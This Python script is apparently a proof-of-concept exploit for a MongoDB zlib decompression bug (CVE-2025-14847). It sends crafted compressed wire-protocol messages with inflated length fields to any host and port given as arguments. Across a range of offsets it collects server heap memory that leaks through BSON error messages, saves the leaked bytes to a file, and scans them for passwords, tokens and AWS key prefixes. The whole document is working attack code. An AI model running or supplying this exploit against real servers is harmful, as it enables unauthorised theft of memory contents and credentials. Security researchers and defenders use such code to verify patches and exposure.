#!/usr/bin/env python3
"""
mongobleed.py - CVE-2025-14847 MongoDB Memory Leak Exploit

Author: Joe Desimone - x.com/dez_

Exploits zlib decompression bug to leak server memory via BSON field names.
Technique: Craft BSON with inflated doc_len, server reads field names from
leaked memory until null byte.
"""

import socket
import struct
import zlib
import re
import argparse
import sys

def send_probe(host, port, doc_len, buffer_size):
    """Send crafted BSON with inflated document length"""
    # Minimal BSON content - we lie about total length
    content = b'\x10a\x00\x01\x00\x00\x00'  # int32 a=1
    bson = struct.pack('<i', doc_len) + content
    
    # Wrap in OP_MSG
    op_msg = struct.pack('<I', 0) + b'\x00' + bson
    compressed = zlib.compress(op_msg)
    
    # OP_COMPRESSED with inflated buffer size (triggers the bug)
    payload = struct.pack('<I', 2013)  # original opcode
    payload += struct.pack('<i', buffer_size)  # claimed uncompressed size
    payload += struct.pack('B', 2)  # zlib
    payload += compressed
    
    header = struct.pack('<IIII', 16 + len(payload), 1, 0, 2012)
    
    MAX_RESPONSE_SIZE = 10 * 1024 * 1024  # 10MB limit
    
    try:
        with socket.socket() as sock:
            sock.settimeout(2)
            sock.connect((host, port))
            sock.sendall(header + payload)
            
            response = b''
            while len(response) < MAX_RESPONSE_SIZE:
                if len(response) >= 4:
                    expected = struct.unpack('<I', response[:4])[0]
                    if len(response) >= expected:
                        break
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            return response
    except (socket.error, socket.timeout, ConnectionRefusedError) as e:
        print(f"[!] Connection error at offset {doc_len}: {e}", file=sys.stderr)
        return b''
    except struct.error as e:
        print(f"[!] Malformed response at offset {doc_len}", file=sys.stderr)
        return b''

def extract_leaks(response):
    """Extract leaked data from error response"""
    if len(response) < 25:
        return []
    
    try:
        msg_len = struct.unpack('<I', response[:4])[0]
        if struct.unpack('<I', response[12:16])[0] == 2012:
            raw = zlib.decompress(response[25:msg_len])
        else:
            raw = response[16:msg_len]
    except (struct.error, zlib.error, IndexError) as e:
        return []
    
    leaks = []
    
    # Field names from BSON errors
    for match in re.finditer(rb"field name '([^']*)'", raw):
        data = match.group(1)
        if data and data not in [b'?', b'a', b'$db', b'ping']:
            leaks.append(data)
    
    # Type bytes from unrecognized type errors
    for match in re.finditer(rb"type (\d+)", raw):
        leaks.append(bytes([int(match.group(1)) & 0xFF]))
    
    return leaks

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-14847 MongoDB Memory Leak')
    parser.add_argument('--host', default='localhost', help='Target host')
    parser.add_argument('--port', type=int, default=27017, help='Target port')
    parser.add_argument('--min-offset', type=int, default=20, help='Min doc length')
    parser.add_argument('--max-offset', type=int, default=8192, help='Max doc length')
    parser.add_argument('--output', default='leaked.bin', help='Output file')
    args = parser.parse_args()
    
    print(f"[*] mongobleed - CVE-2025-14847 MongoDB Memory Leak")
    print(f"[*] Author: Joe Desimone - x.com/dez_")
    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Scanning offsets {args.min_offset}-{args.max_offset}")
    print()
    
    all_leaked = bytearray()
    unique_leaks = set()
    
    for doc_len in range(args.min_offset, args.max_offset):
        response = send_probe(args.host, args.port, doc_len, doc_len + 500)
        leaks = extract_leaks(response)
        
        for data in leaks:
            if data not in unique_leaks:
                unique_leaks.add(data)
                all_leaked.extend(data)
                
                # Show interesting leaks (> 10 bytes)
                if len(data) > 10:
                    preview = data[:80].decode('utf-8', errors='replace')
                    print(f"[+] offset={doc_len:4d} len={len(data):4d}: {preview}")
    
    # Save results
    with open(args.output, 'wb') as f:
        f.write(all_leaked)
    
    print()
    print(f"[*] Total leaked: {len(all_leaked)} bytes")
    print(f"[*] Unique fragments: {len(unique_leaks)}")
    print(f"[*] Saved to: {args.output}")
    
    # Show any secrets found
    secrets = [b'password', b'secret', b'key', b'token', b'admin', b'AKIA']
    try:
        all_leaked_lower = bytes(all_leaked).lower()
        for s in secrets:
            if s.lower() in all_leaked_lower:
                print(f"[!] Found pattern: {s.decode()}")
    except (UnicodeDecodeError, AttributeError):
        # Handle cases where binary data can't be processed as text
        pass

if __name__ == '__main__':
    main()
